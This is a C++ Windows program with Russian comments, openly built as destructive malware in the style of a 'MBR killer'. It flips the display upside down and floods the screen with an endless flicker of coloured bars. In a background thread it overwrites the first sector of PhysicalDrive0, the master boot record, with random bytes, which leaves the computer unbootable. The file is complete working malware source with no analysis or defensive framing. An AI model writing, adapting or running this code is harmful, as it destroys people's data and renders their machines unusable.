#include <windows.h>
#include <iostream>
#include <cstdlib>
#include <ctime>
#include <thread>
#include <chrono>

// ==========================================
// ЧАСТЬ 1: СМЕНА ОРИЕНТАЦИИ ЭКРАНА (ПЕРЕВОРОТ)
// ==========================================
void FlipScreen() {
    DEVMODE dm;
    ZeroMemory(&dm, sizeof(dm));
    dm.dmSize = sizeof(dm);
    
    if (EnumDisplaySettings(NULL, ENUM_CURRENT_SETTINGS, &dm)) {
        // Меняем ориентацию на 180 градусов (вверх ногами)
        dm.dmFields = DM_DISPLAYORIENTATION;
        dm.dmDisplayOrientation = DMDO_180;
        ChangeDisplaySettings(&dm, CDS_UPDATEREGISTRY);
    }
}

// ==========================================
// ЧАСТЬ 2: РЕАЛИСТИЧНЫЙ СБОЙ МАТРИЦЫ (GDI-ГЛИТЧ)
// ==========================================
void MatrixGlitch() {
    HDC hdc = GetDC(NULL);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    while (true) {
        // 1. Рисуем случайные цветные полосы (сдвиг картинки)
        for (int i = 0; i < 50; i++) {
            int y = rand() % h;
            int height = rand() % 20 + 1;
            COLORREF color = RGB(rand() % 256, rand() % 256, rand() % 256);
            HBRUSH brush = CreateSolidBrush(color);
            RECT rect = {0, y, w, y + height};
            FillRect(hdc, &rect, brush);
            DeleteObject(brush);
        }
        
        // 2. Сдвиг пикселей (эффект "сбоя матрицы")
        if (rand() % 100 < 20) { // 20% шанс на сдвиг
            int shiftX = rand() % 20 - 10;
            int shiftY = rand() % 20 - 10;
            BitBlt(hdc, shiftX, shiftY, w, h, hdc, 0, 0, SRCCOPY);
        }
        
        Sleep(10); // Задержка для мерцания
    }
    ReleaseDC(NULL, hdc);
}

// ==========================================
// ЧАСТЬ 3: СНОС MBR (BOOTKIT)
// ==========================================
void DestroyMBR() {
    HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, 
                                 FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice != INVALID_HANDLE_VALUE) {
        BYTE garbage[512];
        srand(time(NULL));
        for (int i = 0; i < 512; i++) {
            garbage[i] = rand() % 256;
        }
        DWORD bytesWritten;
        WriteFile(hDevice, garbage, 512, &bytesWritten, NULL);
        CloseHandle(hDevice);
    }
}

// ==========================================
// ГЛАВНАЯ ФУНКЦИЯ
// ==========================================
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    srand(time(NULL));

    // 1. Переворачиваем экран
    FlipScreen();

    // 2. Сносим MBR в отдельном потоке
    std::thread mbrThread(DestroyMBR);
    mbrThread.detach();

    // 3. Запускаем глитч (он бесконечный)
    MatrixGlitch();

    return 0;
}
